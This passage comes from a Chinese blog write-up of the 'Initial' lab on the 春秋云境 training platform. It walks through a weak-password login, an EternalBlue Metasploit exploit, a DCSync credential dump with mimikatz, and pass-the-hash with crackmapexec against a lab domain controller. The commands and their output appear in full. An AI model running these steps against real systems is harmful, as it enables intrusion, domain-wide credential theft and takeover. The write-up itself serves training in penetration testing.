<a class=header-anchor href=#flag2></a></h2><p>配置完后就能直接在浏览器中输入172.22.1.18进行访问了，可以看到该系统的版本是2.2.8（这个是重点，可以通过搜索系统的版本号看看有没有已经给发现的漏洞）</p><p>这里存在一个弱口令，admin/admin123 （这里可以抓包然后burp来爆破即可）</p><p>我们直接在Administrator用户的目录下找到 flag2</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span> ___    ___ ___  ________  ________  ________  ________  ________   ________     
</span></span><span style=display:flex><span>|<span style=color:#b62;font-weight:700>\ </span> <span style=color:#b62;font-weight:700>\ </span> /  /|<span style=color:#b62;font-weight:700>\ </span> <span style=color:#b62;font-weight:700>\|\ </span>  __  <span style=color:#b62;font-weight:700>\|\ </span>  __  <span style=color:#b62;font-weight:700>\|\ </span>  __  <span style=color:#b62;font-weight:700>\|\ </span>  __  <span style=color:#b62;font-weight:700>\|\ </span>  ___  <span style=color:#b62;font-weight:700>\|\ </span>  ____<span style=color:#b62;font-weight:700>\ </span>   
</span></span><span style=display:flex><span><span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\/</span>  / | <span style=color:#b62;font-weight:700>\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\|\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\|\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\|\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\|\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\\</span> <span style=color:#b62;font-weight:700>\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\_</span>__|    
</span></span><span style=display:flex><span> <span style=color:#b62;font-weight:700>\ \ </span>   / / <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\ \ </span>  __  <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\\\ </span> <span style=color:#b62;font-weight:700>\ \ </span>  _  _<span style=color:#b62;font-weight:700>\ \ </span>  __  <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\\</span> <span style=color:#b62;font-weight:700>\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\ </span> ___  
</span></span><span style=display:flex><span>  /     <span style=color:#b62;font-weight:700>\/</span>   <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\\\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\\</span>  <span style=color:#b62;font-weight:700>\\</span> <span style=color:#b62;font-weight:700>\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\\</span> <span style=color:#b62;font-weight:700>\ </span> <span style=color:#b62;font-weight:700>\ \ </span> <span style=color:#b62;font-weight:700>\|\ </span> <span style=color:#b62;font-weight:700>\ </span>
</span></span><span style=display:flex><span> /  /<span style=color:#b62;font-weight:700>\ </span>  <span style=color:#b62;font-weight:700>\ </span>   <span style=color:#b62;font-weight:700>\ \_</span>_<span style=color:#b62;font-weight:700>\ \_</span>_<span style=color:#b62;font-weight:700>\ \_</span>_<span style=color:#b62;font-weight:700>\ \_</span>______<span style=color:#b62;font-weight:700>\ \_</span>_<span style=color:#b62;font-weight:700>\\</span> _<span style=color:#b62;font-weight:700>\\</span> <span style=color:#b62;font-weight:700>\_</span>_<span style=color:#b62;font-weight:700>\ \_</span>_<span style=color:#b62;font-weight:700>\ \_</span>_<span style=color:#b62;font-weight:700>\\</span> <span style=color:#b62;font-weight:700>\_</span>_<span style=color:#b62;font-weight:700>\ \_</span>______<span style=color:#b62;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#b62;font-weight:700></span>/__/ /<span style=color:#b62;font-weight:700>\ </span>__<span style=color:#b62;font-weight:700>\ </span>   <span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>_______|<span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>__| <span style=color:#b62;font-weight:700>\|</span>__|<span style=color:#b62;font-weight:700>\|</span>_______|
</span></span><span style=display:flex><span>|__|/ <span style=color:#b62;font-weight:700>\|</span>__|                                                                      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag02: 2ce3-4813-87d4-
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Awesome! ! ! You found the second flag, now you can attack the domain controller.
</span></span></code></pre></div><h1 id=第三阶段>第三阶段
<a class=header-anchor href=#%e7%ac%ac%e4%b8%89%e9%98%b6%e6%ae%b5></a></h1><h2 id=kali代理设置>kali代理设置
<a class=header-anchor href=#kali%e4%bb%a3%e7%90%86%e8%ae%be%e7%bd%ae></a></h2><p>接下来我们就对ip 172.22.1.21进行渗透，这里需要用到渗透框架Metasploit Framework，kali自带这个框架，这里的攻击机我选用kali（windows也可以安装Metasploit Framework，不过要在kali设置代理）。我们首先要在kali中设置socks5代理，否则我们无法访问其内网的环境。
在kali中设置代理比windows简单很多，他自带了一个proxychains4工具，我们只需要编辑/etc/proxychains4.conf文件：</p><ul><li>如果是用frp，在最下面的ProxyList上加上socks5 vps 798 即可</li><li>如果是用gost，在最下面加上socks5 题目中外网的ip 8080</li></ul><p><strong>但是最关键的一点来了</strong>，因为不像windows有proxifier那种全局代理，这里代理后运行任何软件如果想走代理，需要这样做,这样才能正确地走代理访问到内网，不然默认是不会走代理的，所以用什么模块即使设置了RHOSTS，也会connection失败</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains msfconsole
</span></span></code></pre></div><h2 id=flag3>flag3
<a class=header-anchor href=#flag3></a></h2><p>永恒之蓝漏洞直接msf一把梭</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span>use exploit/windows/smb/ms17_010_eternalblue  <span style=color:#080;font-style:italic># 选择使用的模块</span>
</span></span><span style=display:flex><span><span style=color:#a2f>set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span style=color:#080;font-style:italic># 设置payload，可以通过show payloads查看</span>
</span></span><span style=display:flex><span><span style=color:#a2f>set</span> RHOSTS 172.22.1.21  <span style=color:#080;font-style:italic># 设置靶机的ip</span>
</span></span><span style=display:flex><span>run <span style=color:#080;font-style:italic># 发起攻击</span>
</span></span></code></pre></div><p>紧接着上图，可以发现我们已经成功的打进该主机，遗憾的是该机子上并没有 flag ，也就是说我们最后的flag 在 windows DC 域控制器上面
接下来是进行 DCSync 攻击，这里简单解释一下：
首先，什么是 DCSync</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。
</span></span><span style=display:flex><span>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash
</span></span></code></pre></div><p>也就是说我们可以通过DCSync来导出所有用户的 hash 然后进行哈希传递攻击，要想使用 DCSync 必须获得以下任一用户的权限</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>Administrators 组内的用户
</span></span><span style=display:flex><span>Domain Admins 组内的用户
</span></span><span style=display:flex><span>Enterprise Admins 组内的用户域控制器的计算机帐户
</span></span></code></pre></div><p>现在我们回看一开始fscan的扫描结果</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#666>[</span>+<span style=color:#666>]</span> MS17-010 172.22.1.21    <span style=color:#666>(</span>Windows Server <span style=color:#666>2008</span> R2 Enterprise <span style=color:#666>7601</span> Service Pack 1<span style=color:#666>)</span>
</span></span></code></pre></div><p>我们可以看到我们用永恒之蓝打下的这台机子是 enterprise 用户，也就是说满足 DCSync 攻击的条件，于是我们在 msf 中依次输入以下命令来获取用户的 hash</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span>load kiwi  <span style=color:#080;font-style:italic># 调用mimikatz模块</span>
</span></span><span style=display:flex><span>kiwi_cmd <span style=color:#b44>&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> <span style=color:#a2f>exit</span>  <span style=color:#080;font-style:italic># 导出域内所有用户的信息(包括哈希值)</span>
</span></span></code></pre></div><p>最后也是注意crackmapexec前要加个proxychains</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#666>(</span>kali㉿kali<span style=color:#666>)</span>-<span style=color:#666>[</span>~/Desktop<span style=color:#666>]</span>
</span></span><span style=display:flex><span>└─$ proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span style=color:#b44>&#34;type Users\Administrator\flag\flag03.txt&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> First <span style=color:#a2f>time</span> use detected
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Creating home directory structure
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Creating default workspace
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Initializing RDP protocol database
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Initializing SSH protocol database
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Initializing LDAP protocol database
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Initializing FTP protocol database
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Initializing WINRM protocol database
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Initializing SMB protocol database
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Initializing MSSQL protocol database
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Copying default configuration file
</span></span><span style=display:flex><span><span style=color:#666>[</span>*<span style=color:#666>]</span> Generating SSL certificate
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             <span style=color:#666>[</span>*<span style=color:#666>]</span> Windows Server <span style=color:#666>2016</span> Datacenter <span style=color:#666>14393</span> x64 <span style=color:#666>(</span>name:DC01<span style=color:#666>)</span> <span style=color:#666>(</span>domain:xiaorang.lab<span style=color:#666>)</span> <span style=color:#666>(</span>signing:True<span style=color:#666>)</span> <span style=color:#666>(</span>SMBv1:True<span style=color:#666>)</span>
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             <span style=color:#666>[</span>+<span style=color:#666>]</span> xiaorang.lab<span style=color:#b62;font-weight:700>\a</span>dministrator:10cf89a850fb1cdbe6bb432b859164c8 <span style=color:#666>(</span>Pwn3d!<span style=color:#666>)</span>
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             <span style=color:#666>[</span>+<span style=color:#666>]</span> Executed <span style=color:#a2f>command</span> 
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             ___   ___
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             <span style=color:#b62;font-weight:700>\\</span> / /       / /    // | |     //   <span style=color:#666>)</span> <span style=color:#666>)</span> //   <span style=color:#666>)</span> <span style=color:#666>)</span>  // | |     /|    / / //   <span style=color:#666>)</span> <span style=color:#666>)</span>
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             <span style=color:#b62;font-weight:700>\ </span> /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             / /       / /    / ___  |   //   / / / ___ <span style=color:#666>(</span>   / ___  |   // |  / / //  ____
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             / /<span style=color:#b62;font-weight:700>\\</span>     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /                                                                         
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             / /  <span style=color:#b62;font-weight:700>\\</span> __/ /___ //     | | <span style=color:#666>((</span>___/ / //    | | //     | | //   |/ / <span style=color:#666>((</span>____/ /                                                                         
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             flag03: e8f88d0d43d6<span style=color:#666>}</span>
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             
</span></span><span style=display:flex><span>SMB         172.22.1.2      <span style=color:#666>445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network. 
</span></span></code></pre></div><h2 id=相关工具解释>相关工具解释
<a class=header-anchor href=#%e7%9b%b8%e5%85%b3%e5%b7%a5%e5%85%b7%e8%a7%a3%e9%87%8a></a></h2><ul><li>crackmapexec</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>crackmapexec smb: CrackMapExec 是一个常用于渗透测试的工具，它支持对 SMB、LDAP、WinRM、SSH 等多种协议的攻击和利用，这里选择的是 smb 模块，针对 SMB 服务进行操作。
</span></span><span style=display:flex><span>172.22.1.2: 目标机器的 IP 地址，即你要攻击的 SMB 服务器。
</span></span><span style=display:flex><span>-u administrator: 指定用于登录的用户名，这里是 administrator。
</span></span><span style=display:flex><span>-H 10cf89a850fb1cdbe6bb432b859164c8: 使用 NTLM hash 来代替明文密码登录，这里给出的是该账户的 NTLM hash。
</span></span><span style=display:flex><span>-d xiaorang.lab: 指定目标机器的域，域名是 xiaorang.lab。
</span></span><span style=display:flex><span>-x &#34;type Users\Administrator\flag\flag03.txt&#34;: 在目标机器上执行命令。这里执行的命令是 Windows 的 type 命令，用于查看文件内容，Users\Administrator\flag\flag03.txt 表示要读取的文件路径。
</span></span></code></pre></div><ul><li>load kiwi</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>这条命令的含义是加载 Kiwi 模块。Kiwi 是 CrackMapExec 中对 Mimikatz 的集成实现，而 Mimikatz 是一个非常著名的 Windows 安全工具，主要用于从内存中提取密码、哈希值、PIN 码和 Kerberos 票据等信息。在这里，通过 load kiwi，你启用了 Mimikatz 的相关功能，可以执行类似 Mimikatz 的命令。
</span></span></code></pre></div><ul><li>kiwi_cmd &ldquo;lsadump::dcsync /domain:xiaorang.lab /all /csv&rdquo;</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>这一命令的作用是调用 Kiwi（即 Mimikatz）模块中的 lsadump::dcsync 命令来执行针对域控制器的 DCSync 攻击。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>解释：
</span></span><span style=display:flex><span>kiwi_cmd &#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;: 通过 Kiwi 模块执行 mimikatz 的命令。
</span></span><span style=display:flex><span>lsadump::dcsync: 这是 Mimikatz 的一个非常强大的功能，叫做 DCSync，它允许你模拟域控制器的行为，来提取域内所有用户的密码数据，而不需要直接在域控制器上执行命令。
</span></span><span style=display:flex><span>/domain:xiaorang.lab: 指定要攻击的域名为 xiaorang.lab。
</span></span><span style=display:flex><span>/all: 表示提取所有域用户的 NTLM 哈希值和密码数据。
</span></span><span style=display:flex><span>/csv: 以 CSV 格式输出结果。
</span></span></code></pre></div></div><footer class=post-footer><div class=post-tags><a href=/tags/%e6%b8%97%e9%80%8f>渗透</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
春秋云境 Initial</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://zp9080.github.io/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/ title="春秋云境 Initial">https://zp9080.github.io/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/ rel=next title=sql注入初探><i class="fa fa-chevron-left"></i> sql注入初探</a></div><div class="post-nav-prev post-nav-item"><a href=/post/%E7%AC%94%E8%AE%B0/github%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/ rel=prev title=Github使用笔记>Github使用笔记
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2024 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
<img src=/imgs/gongan.png alt=鄂公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>